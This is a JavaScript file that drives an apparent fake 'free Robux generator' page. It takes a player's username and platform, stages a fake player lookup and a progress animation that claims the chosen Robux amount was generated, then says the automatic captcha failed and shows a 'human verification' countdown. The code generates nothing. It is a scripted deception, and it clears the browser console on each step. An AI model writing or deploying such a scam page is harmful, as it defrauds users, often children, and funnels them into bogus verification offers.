$(document).ready(function() {

    ////////////////
    // Text Strings
    //////////////// 
    cstm_1 = "Loading...";
    cstm_2 = "Generating <span class='dcsfpw-cm-r-g-v dcsfpw-cm-r-g-v-1 chim'></span> <span class='dcsfpw-cm-r-g-l dcsfpw-cm-r-g-l-1 chim'></span> for <span class='dcsfpw-cm-u-v chim'></span>";
    cstm_3 = "Succesfully generated <span class='dcgiresv'></span>";
    cstm_4 = "Loading...";
    cstm_5 = "Performing captcha...";
    cstm_6 = "<span class='clmet'>Automatic captcha failed</span>";
    cstm_7 = "<span class='clmet'>Please bypass it manually</span>";

    ////////////////
    // R1 Values
    //////////////// 
    rv1_1 = "10000";
    rv1_2 = "25000";
    rv1_3 = "50000";
    rv1_4 = "99999";
    rn1 = "Robux"

    ////////////////
    // Verification Timer
    //////////////// 
    var $human_verification_timer_value = '180'; //Countdown remaing time in seconds	

    se = 1;
    if (se == 1) {
        sp = "../a/";
        ion.sound({
            sounds: [{
                    name: "b1",
                    path: sp,
                    volume: 1
                },
                {
                    name: "b2",
                    path: sp,
                    volume: 1
                },
                {
                    name: "a1",
                    path: sp,
                    volume: 1
                },
                {
                    name: "a2",
                    path: sp,
                    volume: 1
                },
                {
                    name: "c2",
                    path: sp,
                    volume: 1
                },
                {
                    name: "s1",
                    path: sp,
                    volume: 1
                },
                {
                    name: "s2",
                    path: sp,
                    volume: 1
                },
                {
                    name: "c1",
                    path: sp,
                    volume: 1,
                    loop: true
                }
            ],
            path: sp,
            preload: true,
            multiplay: true
        });
    }

    var srov;
    var se;
    se = 1;
    if ($('#particles-w').length) {
        particlesJS.load('particles-w', 'js/particlesjs-config.json');
    }
    var sp;
    sp = '';

    function fixplatformBox($platform_parent_class) {
        resetplatformBoxes();
        if ($platform_parent_class.hasClass('platform-item-1')) {
            sp = 'Windows PC';
        }
        if ($platform_parent_class.hasClass('platform-item-2')) {
            sp = 'Playstation';
        }
        if ($platform_parent_class.hasClass('platform-item-3')) {
            sp = 'Xbox';
        }
        if ($platform_parent_class.hasClass('platform-item-4')) {
            sp = 'Android';
        }
        if ($platform_parent_class.hasClass('platform-item-5')) {
            sp = 'iOS';
        }
        if ($platform_parent_class.hasClass('platform-item-6')) {
            sp = 'Nintendo';
        }
        $platform_parent_class.addClass('active');
    }

    function resetplatformBoxes() {
        var $platform_list = $('.platform-item-1, .platform-item-2, .platform-item-3, .platform-item-4, .platform-item-5, .platform-item-6');
        if ($platform_list.hasClass('active')) {
            $platform_list.removeClass('active');
        }
    }
    $('.platform-item').click(function() {
        if (!$(this).hasClass("active")) {
            if (se == 1) {
                ion.sound.play("b1");
            }
            aO(this, 'jello');
        }
        fixplatformBox($(this));
    });
    $('#stp-1-in').on('keypress', function(e) {
        if (e.which === 13) {
            if (se == 1) {
                ion.sound.play("b2");
            }
            if ($('#stp-1-in').val() == '') {
                aO($('.iew-e-u'), 'fadeIn');
                $('.ie-w-1').fadeIn(function() {
                    setTimeout(function() {
                        $('.ie-w-1').addClass('animated fadeOut').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() {
                            $(this).removeClass('animated fadeOut');
                            $(this).hide();
                        });
                    }, 200);
                });
            }
            if (sp == '') {
                aO($('.ie-w-2'), 'fadeIn');
                $('.ie-w-2').fadeIn(function() {
                    setTimeout(function() {
                        $('.ie-w-2').addClass('animated fadeOut').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() {
                            $(this).removeClass('animated fadeOut');
                            $(this).hide();
                        });
                    }, 200);
                });
            }
            if (sp != '' && $('#stp-1-in').val() != '') {
                epu = $('#stp-1-in').val();
                ftim();
            }
        }
    });
    $(document).on("click", "#sob", function() {
        if (se == 1) {
            ion.sound.play("b2");
        }
        if ($('#stp-1-in').val() == '') {
            aO($('.iew-e-u'), 'fadeIn');
            $('.ie-w-1').fadeIn(function() {
                setTimeout(function() {
                    $('.ie-w-1').addClass('animated fadeOut').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() {
                        $(this).removeClass('animated fadeOut');
                        $(this).hide();
                    });
                }, 200);
            });
        }
        if (sp == '') {
            aO($('.ie-w-2'), 'fadeIn');
            $('.ie-w-2').fadeIn(function() {
                setTimeout(function() {
                    $('.ie-w-2').addClass('animated fadeOut').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() {
                        $(this).removeClass('animated fadeOut');
                        $(this).hide();
                    });
                }, 200);
            });
        }
        if (sp != '' && $('#stp-1-in').val() != '') {
            epu = $('#stp-1-in').val();
            ftim();
        }
    });

    function ftim() {
        gS("inpart1", function(src) {
            if (se == 1) {
                ion.sound.play("s2");
            }
            $(".stp-1-field-content").fadeOut(300);
            $("#sob").fadeOut(300);
            setTimeout(function() {
                $('.stp-dc').html(src);
                $('#spcimv').html(epu);
                setTimeout(function() {
                    if (se == 1) {
                        ion.sound.play("s1");
                    }
                    $('.sp-ic-w').html('<span class="material-icons-two-tone animated bounceIn scpfico">check_circle</span>');
                    $('.spcim').removeClass('animated pulse infinite');
                    $('.spcim').addClass('animated bounceIn');
                    $('.spcim').html('Player Found');
                }, 3000);
                setTimeout(function() {
                    $('.dcc-p1').removeClass('animated bounceIn');
                    $('.dcc-p1').addClass('animated bounceOut');
                }, 4000);
                setTimeout(function() {
                    gS("inpart2", function(src) {
                        $('.stp-dc').html(src);
                        if (se == 1) {
                            ion.sound.play("a1");
                        }
                        $('.dcrs-ri-1-1 .dcsr-rc-rv').html(rv1_1);
                        $('.dcrs-ri-1-2 .dcsr-rc-rv').html(rv1_2);
                        $('.dcrs-ri-1-3 .dcsr-rc-rv').html(rv1_3);
                        $('.dcrs-ri-1-4 .dcsr-rc-rv').html(rv1_4);
                        $('.gcontent').append('<div class="sc-btn-wrapper animated pulse infinite"><div class="animated bounceIn animation-delay-1000"><div id="stwb" class="sc-btn"><span>Continue</span></div></div></div>');
                        srov = rv1_1;

                        function fixsrovBox($srov_parent_class) {
                            resetsrovBoxes();
                            if ($srov_parent_class.hasClass('dcrs-ri-1-1')) {
                                srov = rv1_1;
                            }
                            if ($srov_parent_class.hasClass('dcrs-ri-1-2')) {
                                srov = rv1_2;
                            }
                            if ($srov_parent_class.hasClass('dcrs-ri-1-3')) {
                                srov = rv1_3;
                            }
                            if ($srov_parent_class.hasClass('dcrs-ri-1-4')) {
                                srov = rv1_4;
                            }
                            $srov_parent_class.addClass('active');
                        }

                        function resetsrovBoxes() {
                            var $srov_list = $('.dcrs-ri-1-1, .dcrs-ri-1-2, .dcrs-ri-1-3, .dcrs-ri-1-4');
                            if ($srov_list.hasClass('active')) {
                                $srov_list.removeClass('active');
                            }
                        }
                        $('.dcrs-ri-1').click(function() {
                            if (!$(this).hasClass("active")) {
                                if (se == 1) {
                                    ion.sound.play("b1");
                                }
                                aO(this, 'headShake');
                            }
                            fixsrovBox($(this));
                        });
                        $(document).on("click", "#stwb", function() {
                            if (se == 1) {
                                ion.sound.play("b2");
                            }
                            $(".dcc-p2 .dcc-c").fadeOut(300);
                            $("#stwb").fadeOut(300);
                            setTimeout(function() {
                                gS("inpart4", function(src) {
                                    $('.stp-dc').html(src);
                                    if (se == 1) {
                                        ion.sound.play("a1");
                                    }
                                    $('.dcsfpw-rgi-w-1 .rgi-w-rl').html(rn1);

                                    function progressBar(percent, $element, duration) {
                                        var progressBarWidth = percent * $element.width() / 100;
                                        $element.find('div').animate({
                                            width: progressBarWidth
                                        }, duration).html(percent + "%&nbsp;");
                                    }
                                    progressBar(0, $('#dcsfpw-lb'), 1);
                                    progressBar(100, $('#dcsfpw-lb'), 24000);
                                    mA(0, cstm_1, 0, 0, 0);
                                    mA(3000, cstm_2, 1, 0, 0);
                                    mA(8000, cstm_3, 3, 0, 1);
                                    mA(10500, cstm_4, 0, 0, 3);
                                    mA(12500, cstm_5, 0, 0, 0);
                                    mA(14500, cstm_6, 0, 0, 4);
                                    mA(16500, cstm_7, 0, 0, 2);
                                    mA(18000, '', 0, 1, 0);
                                });
                            }, 400);
                        });
                    });
                }, 5000);
            }, 400);
        });
    }

    function aO(el, anim, onDone) {
        var $el = $(el);
        $el.addClass('animated ' + anim);
        $el.one('animationend', function() {
            $(this).removeClass('animated ' + anim);
            onDone && onDone();
        });
    }

    function mA(tD, cms, gc, sl, cl) {
        setTimeout(function() {
            $(".dcsfpw-cm-w span").html(cms);
            aO($(".dcsfpw-cm-w"), 'bounceIn');
            if (gc === 1) {
                $('.dcsfpw-ld-w').fadeOut(function() {
                    aO($('.dcsfpw-rgi-w-1'), 'bounceIn');
                    $('.dcsfpw-rgi-w-1').fadeIn(function() {
                        if (se == 1) {
                            ion.sound.play("c1");
                        }
                        $('.dcsfpw-rgi-w-1 .rgi-w-rv').countTo({
                            from: 0,
                            to: srov,
                            speed: 2900,
                            refreshInterval: 10,
                            onComplete: function(value) {
                                if (se == 1) {
                                    ion.sound.stop("c1");
                                }
                            }
                        });
                    });
                });
                $(".dcsfpw-cm-r-g-v-1").html(srov);
                $(".dcsfpw-cm-r-g-l-1").html(rn1);
                $(".dcsfpw-cm-u-v").html(epu);
            }
            if (gc === 3) {
                $('.dcsfpw-rgi-w-1').fadeOut(function() {
                    aO($('.dcsfpw-ld-w'), 'bounceIn');
                    $('.dcsfpw-ld-w').fadeIn();
                });
            }
            if (cl === 1) {
                if (se == 1) {
                    ion.sound.play("s1");
                }
                $('.dcsfpw-ld-w').html("<span class='material-icons-two-tone lic-s'>check_circle</span>");
                aO($(".dcsfpw-ld-w"), 'bounceIn');
                $(".dcgiresv").html('<span class="chim">' + srov + ' ' + rn1 + '</span>');
            }
            if (cl === 2) {
                $('.dcsfpw-ld-w').html("<span class='material-icons-two-tone lic-i'>info</span>");
                aO($(".dcsfpw-ld-w"), 'bounceIn');
            }
            if (cl === 3) {
                $('.dcsfpw-ld-w').html("<span class='material-icons-two-tone fa-spin'>settings</span>");
                aO($(".dcsfpw-ld-w"), 'bounceIn');
            }
            if (cl === 4) {
                $('.dcsfpw-ld-w').html("<span class='material-icons-two-tone lic-e'>highlight_off</span>");
                aO($(".dcsfpw-ld-w"), 'bounceIn');
            }
            if (sl === 1) {
                gS("inpart5", function(src) {
                    $(".dcc-p4 .dcc-c").fadeOut(300);
                    setTimeout(function() {
                        $('.stp-dc').html(src);
                        if (se == 1) {
                            ion.sound.play("a1");
                            ion.sound.play("c2");
                        }
                        $('#hvw-ic-u').html(epu);
                        $('#hvw-ic-a-1').html(srov);
                        $('.dcsfpw-rgi-w-1 .hv-rgi-w-rv').html(srov);
                        $('.dcsfpw-rgi-w-1 .rgi-w-rl').html(rn1);
                        human_verification_timer.init($human_verification_timer_value);
                        $(document).on("click", "#hw-btn", function() {
                            if (se == 1) {
                                ion.sound.play("b2");
                            }
                        });
                    }, 350);
                });
            }
        }, tD);
    }

    function gS(step, onStep) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'inc/' + step + '.php');
        xhr.setRequestHeader("X-REQUESTED-WITH", 'xmlhttprequest');
        xhr.addEventListener('readystatechange', function() {
            if (xhr.readyState == 4) {
                onStep && onStep(xhr.responseText)
            }
        });
        xhr.send()
        console.clear();
        console.log("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
    }
});
////////////////
// Verification Timer
////////////////
var human_verification_timer = function() {
    var time_left = 15;
    var keep_counting = 1;
    var time_out_msg = 'few seconds';

    function countdown() {
        if (time_left < 2) {
            keep_counting = 0;
        }
        time_left = time_left - 1;
    }

    function add_leading_zero(n) {
        if (n.toString().length < 2) {
            return '0' + n;
        } else {
            return n;
        }
    }

    function format_output() {
        var hours, minutes, seconds;
        seconds = time_left % 60;
        minutes = Math.floor(time_left / 60) % 60;
        hours = Math.floor(time_left / 3600);
        seconds = add_leading_zero(seconds);
        minutes = add_leading_zero(minutes);
        hours = add_leading_zero(hours);
        return minutes + ' minutes and ' + seconds + ' seconds';
    }

    function timer_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = '<span>' + format_output() + '</span>';
    }

    function no_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = time_out_msg;
    }
    return {
        count: function() {
            countdown();
            timer_time_left();
        },
        timer: function() {
            human_verification_timer.count();
            if (keep_counting) {
                setTimeout("human_verification_timer.timer();", 1000);
            } else {
                no_time_left();
            }
        },
        init: function(n) {
            time_left = n;
            human_verification_timer.timer();
        }
    };
}();

function rng(min, max) {
    return Math.floor(Math.random() * (max - min + 1) + min);

}

function Random(_0xaa63x2, _0xaa63x3) {
    return Math['floor'](Math['random']() * (_0xaa63x3 - _0xaa63x2) + _0xaa63x2);
};